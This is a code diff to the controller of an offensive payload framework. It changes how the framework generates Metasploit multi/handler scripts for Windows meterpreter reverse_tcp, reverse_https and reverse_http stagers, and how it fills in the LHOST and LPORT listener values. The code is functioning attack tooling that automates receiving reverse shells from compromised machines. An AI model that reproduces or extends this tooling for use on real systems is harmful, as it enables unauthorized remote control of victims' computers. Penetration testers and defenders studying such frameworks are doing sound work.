@@ -436,7 +436,15 @@ class Controller:
                 # if the shellcode wasn't custom, build out a handler script
                 handler = "use exploit/multi/handler\n"
                 handler += "set PAYLOAD " + payload.shellcode.msfvenompayload + "\n"
-                handler += "set LHOST 0.0.0.0\n"
+
+                # extract LHOST if it's there
+                p = re.compile('LHOST=(.*?) ')
+                parts = p.findall(payload.shellcode.msfvenomCommand)
+                if len(parts) > 0:
+                    handler += "set LHOST " + parts[0] + "\n"
+                else:
+                    # try to extract this local IP
+                    handler += "set LHOST " + helpers.LHOST() + "\n"
                 
                 # extract LPORT if it's there
                 p = re.compile('LPORT=(.*?) ')
@@ -470,6 +478,7 @@ class Controller:
             # check if any options specify that we should build a handler out
             keys = payload.required_options.keys()
 
+            # assuming if LHOST is set, we need a handler script
             if "LHOST" in keys:
 
                 handler = "use exploit/multi/handler\n"
@@ -490,20 +499,22 @@ class Controller:
                 else:
                     # extract the payload class name from the instantiated object, then chop off the load folder prefix
                     payloadname = "/".join(str(str(payload.__class__)[str(payload.__class__).find("payloads"):]).split(".")[0].split("/")[1:])
-                    
-                    lhost = helpers.LHOST()
 
+                    # pure rev_tcp stager
                     if "tcp" in payloadname.lower():
                         handler += "set PAYLOAD windows/meterpreter/reverse_tcp\n"
-                        handler += "set LHOST 0.0.0.0\n"
+                    # pure rev_https stager
                     elif "https" in payloadname.lower():
                         handler += "set PAYLOAD windows/meterpreter/reverse_https\n"
-                        handler += "set LHOST " + lhost + "\n"
+                    # pure rev_http stager
                     elif "http" in payloadname.lower():
                         handler += "set PAYLOAD windows/meterpreter/reverse_http\n"
-                        handler += "set LHOST " + lhost + "\n"
                     else: pass
 
+                    # grab the LHOST value
+                    handler += "set LHOST " + payload.required_options["LHOST"][0] + "\n"
+
+                # grab the LPORT value if it was set
                 if "LPORT" in keys:
                     handler += "set LPORT " + payload.required_options["LPORT"][0] + "\n"
 
